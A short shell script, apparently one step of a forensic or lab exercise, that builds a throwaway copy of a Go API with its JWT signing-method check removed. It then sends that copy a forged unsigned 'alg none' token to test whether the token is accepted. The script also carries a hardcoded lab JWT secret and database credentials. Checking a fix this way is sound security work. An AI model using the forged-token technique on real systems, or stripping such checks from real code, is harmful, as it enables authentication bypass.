#!/bin/sh
# Paso 4 de la pieza forense: sin la comprobación de t.Method, ¿pasa alg none? En una copia descartable.
rm -rf /tmp/nocheck && cp -r /app/server /tmp/nocheck && cd /tmp/nocheck
python3 - 2>/dev/null || true
awk 'BEGIN{skip=0} /if _, ok := t.Method.\(\*jwt.SigningMethodHMAC\); !ok \{/{skip=3} skip>0{skip--; next} {print}' internal/auth/auth.go > /tmp/a.go && mv /tmp/a.go internal/auth/auth.go
grep -c "SigningMethodHMAC" internal/auth/auth.go
go build -o /tmp/nocheck-api ./cmd/api || exit 1
(JWT_SECRET=laboratorio-esclusa-secreto-de-32-bytes-o-mas DATABASE_URL="postgres://esclusa:esclusa@pg:5432/esclusa?sslmode=disable&timezone=America/Panama" PORT=3012 /tmp/nocheck-api > /tmp/nocheck.log 2>&1 &); sleep 1
HEADER=$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=\n')
PAYLOAD=$(printf '{"sub":"1","exp":9999999999}' | base64 | tr '+/' '-_' | tr -d '=\n')
echo "alg none sin la comprobación: $(curl -s -w ' %{http_code}' localhost:3012/wheels -H "Authorization: Bearer $HEADER.$PAYLOAD.")"
grep "401:" /tmp/nocheck.log | tail -1
kill $(pidof nocheck-api)
